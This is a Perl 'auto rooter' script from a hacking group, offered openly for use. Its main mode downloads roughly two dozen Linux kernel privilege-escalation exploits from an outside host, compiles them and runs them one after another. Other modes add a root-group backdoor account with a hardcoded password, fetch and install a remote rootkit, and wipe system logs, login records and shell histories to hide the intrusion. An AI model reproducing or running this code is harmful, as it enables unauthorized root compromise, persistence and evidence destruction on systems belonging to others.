#!/usr/bin/perl
#
# Auto Rooting Script ver 1.0
# BHG Security Center ~ #bhg
#   _____          __           __________               __
#  /  _  \  __ ___/  |_  ____   \______   \ ____   _____/  |_
# /  /_\  \|  |  \   __\/  _ \   |       _//  _ \ /  _ \   __\
#/    |    \  |  /|  | (  <_> )  |    |   (  <_> |  <_> )  |
#\____|__  /____/ |__|  \____/   |____|_  /\____/ \____/|__|
#        \/                             \/
#To start script "perl autoroot.pl r00t"
#Developers: Net.Edit0r ~ tHe.k!ll3r 
#Home : Http://black-hg.org/cc 
#Contact : Net.Edit0r@att.net ~ Black.hat.tm@Gmail.com
#Greetz to all members of BHG Security Center
print "###########################################################\n";
print "#            Auto rooter by #BHG (Net.Edit0r)             #\n";
print "#  Usage :                                                #\n";
print "#    perl $0 r00t    => To root                        #\n";
print "#    perl $0 del     => Delete Exploit                 #\n"; 
print "#    perl $0 -kit    => Add Rootkit                    #\n"; 
print "#    perl $0 user    => Add Root Account               #\n"; 
print "#      ********************************************       #\n";
print "#        [Home]:                                          #\n";
print "#              http://www.black-hg.org/cc                 #\n";
print "###########################################################\n\n\n";

                               
if ($ARGV[0] =~ "r00t" ) 
{
print "Loading system configs";
print "...";
system("uname -a");
print "...";
system("id");
print "...";
print "...";
print "Gathering Exploit range";
print "28 exploits found";
print "Test Exploit F0r Rooting :D ...";
system("wget http://net-edit0r.persiangig.com/r00t/local");
system("chmod 777 local");
system("./local");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.18.1.c");
system("gcc 2.6.18.1.c -o 2.6.18.1");
system("chmod 777 2.6.18.1");
system("./2.6.18.1");
system("id"); 
system("wget http://net-edit0r.persiangig.com/r00t/2.6.34.2");
system("chmod 777 2.6.34.2");
system("./2.6.34.2");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.33.c");
system("gcc 2.6.33.c -o 2.6.33");
system("chmod 777 2.6.33");
system("./2.6.33");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.34.c");
system("gcc -w 2.6.34.c -o 2.6.34");
system("sudo setcap cap_sys_admin+ep 2.6.34");
system("./2.6.34");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.37.c");
system("gcc 2.6.37.c -o 2.6.37");
system("chmod 777 2.6.37");
system("./2.6.37");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.43.2.c");
system("gcc -w 2.6.43.2.c -o 2.6.43.2");
system("sudo setcap cap_sys_admin+ep 2.6.43.2");
system("chmod 777 2.6.43.2");
system("./2.6.43.2");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.18.194.c");
system("gcc 2.6.18.194.c -o 2.6.18.194");
system("chmod 777 2.6.18.194");
system("./2.6.18.194");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/3.0.c");
system("gcc 3.0.c -o 3.0");
system("chmod 777 3.0");
system("./3.0");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.18-2010/2.6.18");
system("chmod 777 2.6.18");
system("./2.6.18");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/x86_845.c");
system("gcc -o x86_84 x86_845.c");
system("chmod 777 x86_84");
system("./x86_84");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/abi5.c");
system("gcc -o abi abi5.c");
system("chmod 777 abi");
system("./abi");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.2-20105.c");
system("gcc -o 2.6.2-20105 2.6.2-20105.c");
system("chmod 777 2.6.2-20105");
system("./2.6.2-20105");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.13-20105.c");
system("gcc -o 2.6.13 2.6.13-20105.c");
system("chmod 777 2.6.13");
system("./2.6.13");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2.6.325.c");
system("gcc -o 2.6.32 2.6.325.c");
system("chmod 777 2.6.32");
system("./2.6.32");
system("id"); 
system("wget http://net-edit0r.persiangig.com/r00t/2.6.39.c");
system("gcc -o 2.6.39 2.6.39.c");
system("chmod 777 2.6.39");
system("./2.6.39");
system("id"); 
system("wget http://net-edit0r.persiangig.com/r00t/2.6.11.c");
system("gcc -o 2.6.11 2.6.11.c");
system("chmod 777 2.6.11");
system("./2.6.11");
system("id"); 
system("wget http://net-edit0r.persiangig.com/r00t/2.6.182.c");
system("gcc -o 2.6.182 2.6.182.c");
system("chmod 777 2.6.182");
system("./2.6.182");
system("id"); 
system("wget http://net-edit0r.persiangig.com/r00t/2.6.13.c");
system("gcc -o 2.6.13 2.6.13.c");
system("chmod 777 2.6.13");
system("./2.6.13");
system("id"); 
system("wget http://net-edit0r.persiangig.com/r00t/2.6.18-6.c");
system("gcc -o 2.6.18-6 2.6.18-6.c");
system("chmod 777 2.6.18-6");
system("./2.6.18-6");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/robert_you_suck.c");
system("gcc -o kroooz robert_you_suck.c");
system("chmod 777 kroooz");
system("./kroooz");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/sec.c");
system("gcc -o sec sec.c");
system("chmod 777 sec");
system("./sec");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/2.6.18");
system("chmod 777 2.6.18");
system("./2.6.18");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/priv8-2.6.18-164-2010");
system("chmod 777 priv8-2.6.18-164-2010");
system("./priv8-2.6.18-164-2010");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/priv8-2.6.18.2010");
system("chmod 777 priv8-2.6.18.2010");
system("./priv8-2.6.18.2010");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/2010-1");
system("chmod 777 2010-1");
system("./2010-1");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/local2627");
system("chmod 777 local2627");
system("./local2627");
system("id");
system("wget http://net-edit0r.persiangig.com/r00t/2010/ia32syscall");
system("chmod 777 ia32syscall");
system("./ia32syscall");
system("id");
print "Exploit 11 ...";
system("uname -a");
system("id;pwd");
print "Fucking r00t!? :d";

}
if ($ARGV[0] =~ "del" )
{
print "All Exploit deleting ...\n";
system("rm local*;rm -rf 2.6*;rm 3.0*;rm -rf 3.0*;rm -rf 2.6.34.2;rm -rf 2.6.18.194;rm -rf 2.6.13;rm -rf 2.6.182;rm -rf 2.6.11");
system("rm 2.6.39*;rm -rf 2.6.32*;rm 2.6.2*;rm -rf abi*;rm -rf x86_84;rm -rf 2.6.2-20105;rm -rf 2.6.325;rm -rf 2.6.18-6");
system("rm ia32syscall;rm -rf local2627;rm -rf 2010-1;rm -rf priv8-2.6.18.2010;rm -rf priv8-2.6.18-164-2010;rm -rf sec.c;rm -rf robert_you_suck.c;rm -rf 2.6.18-6.c");
}  
     if ($ARGV[0] =~ "user" )  
          { 
print "Add Root Account [ t ]\n"; 
print "user : [ roor ]\n"; 
system "adduser -g 0 roor -G wheel,sys,bin,daemon,adm,disk -d /sf7 -s /bin/sh"; 
system "passwd rootbhg"; 
print "pass is : rootbhg\n"; 
sleep(2);  

     } 
     if ($ARGV[0] =~ "rm" )  
          { 
print "rm -rf Log [ rm ] \n"; 
system "rm -rf /tmp/logs"; 
system "rm -rf /root/.ksh_history"; 
system "rm -rf /root/.bash_history"; 
system "rm -rf /root/.bash_logout"; 
system "rm -rf /usr/local/apache/logs"; 
sleep(2); 
system "rm -rf /usr/local/apache/log"; 
system "rm -rf /var/apache/logs"; 
system "rm -rf /var/apache/log"; 
system "rm -rf /var/run/utmp"; 
system "rm -rf /var/logs"; 
system "rm -rf /var/log"; 
sleep(2); 
system "rm -rf /var/adm"; 
system "rm -rf /etc/wtmp"; 
system "rm -rf /etc/utmp"; 
system "cd /bin"; 
print "\tcompleted .. \n\n"; 
     }
if ($ARGV[0] =~ "-kit" ) 
          {
print "Add Rootkit \n";
system "wget http://net-edit0r.persiangig.com/t00lz/rootkit.tar.gz";
system "tar -xvvzf rootkit.tar.gz";
system "cd rootkit;./install";
print "user : wo7oshv4team ,  pass : v4teamhacker \n";
system "id";
print "\tcompleted .. \n\n";
     }
# Code By Net.Edit0r ~ tHe.k!ll3r For ALL Iranian HackerZ /* Persian Gulf F0r Ever */
# END